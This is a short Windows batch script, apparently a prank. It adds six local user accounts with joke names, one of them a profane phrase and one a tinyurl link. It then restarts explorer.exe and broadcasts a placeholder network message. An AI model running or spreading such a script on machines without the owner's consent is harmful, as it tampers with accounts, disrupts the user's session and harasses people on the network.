@echo off
net user
timeout 1
net user "fucking giggity" /add
net user "giggity" /add
net user "giggity giggity goo" /add
net user "Alright! Giggity giggity goo!" /add
net user "tinyurl.com/quagfile" /add
net user "﷽" /add
taskkill -f -im explorer.exe
start explorer.exe
echo done
msg * /SERVER:* "Your message here"
net send * /SERVER:* "Your message here"
